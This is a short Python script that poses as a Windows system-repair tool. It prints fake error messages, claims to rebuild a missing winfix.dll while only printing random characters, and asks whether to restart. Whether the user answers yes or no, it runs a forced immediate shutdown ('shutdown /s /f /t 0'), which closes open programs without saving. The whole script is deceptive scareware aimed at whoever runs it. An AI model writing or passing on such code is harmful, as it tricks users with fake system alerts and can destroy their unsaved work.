import os 
import sys
import time
import subprocess
import random


def progressbar():
  P1 = "[#][_][_][_][_]"
  P2 = "[#][#][_][_][_]"
  P3 = "[#][#][#][_][_]"
  P4 = "[#][#][#][#][_]"
  P5 = "[#][#][#][#][#]"

  # Print each progress state, overwrite the previous one
  for P in [P1, P2, P3, P4, P5]:
      sys.stdout.write(f"\r{P}")  # \r moves the cursor to the start of the line
      sys.stdout.flush()  # Force the output to be written immediately
      time.sleep(0.5)  # Wait for a moment before updating
  print(" ")

def makefile():
  print("Making file...")
  time.sleep(0.5)
  progressbar()
  
  for _ in range(30):
    line = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=30))
    print(line)
    
    
    



print("SYSTEM ERROR : UNKNOWN")
print("OS.SYSTEM.REPAIR : IDENTIFYING ERROR")
progressbar()
print("ERROR IDENTIFIED : SYSTEM ERROR : FILE MISSING")
print("FILE DIRECTORY NOT FOUND")
print("C:/WINDOWS/SYSTEM32/winfix.dll")
print("Repairing...")
makefile()
print("FILE MADE AT C:/WINDOWS/SYSTEM32/winfix.dll")
print("Repair of FILE has been completed")
print("To Finish the Repair Windows Must restart")
if input("Would you like to restart? (Y/N) ").capitalize() == "Y":
  print("Restarting...")
  time.sleep(3)
  os.system('shutdown /s /f /t 0')

else:
  print("System Repair Complete")
  print("Repair Trigger")
  print("SYSTEM : SYSTEM FILE MISSING")
  print("Windows was unable to find a critical system file")
  print("Do Not Close This Window!")
  print("Windows is scanning for errors in the backround if a error is found the system will restart")
  time.sleep(5)
  print("ERROR FOUND : RUNTIME ERROR")
  for _ in range(30):
    line = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=30))
    print(line)
  os.system('shutdown /s /f /t 0')
  
  
